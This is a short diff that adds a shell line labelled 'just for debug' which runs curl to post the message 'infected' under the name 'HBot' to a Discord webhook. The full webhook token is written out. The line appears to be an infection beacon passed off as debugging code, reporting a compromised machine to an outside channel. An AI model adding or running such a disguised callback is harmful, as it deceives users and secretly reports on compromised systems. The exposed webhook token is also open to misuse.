@@ -1,0 +1,2 @@
+# This is just for debug :)
+curl -H "Content-Type: application/json" -d '{"username": "HBot", "content": "infected"}' "https://discord.com/api/webhooks/859278196524580864/KJVv43LXNCZM9eEXegDVxfMZ1y2unFGGvQDLrXOsLZYwhS5bC3pBQ8RNABuT6NQIA014"
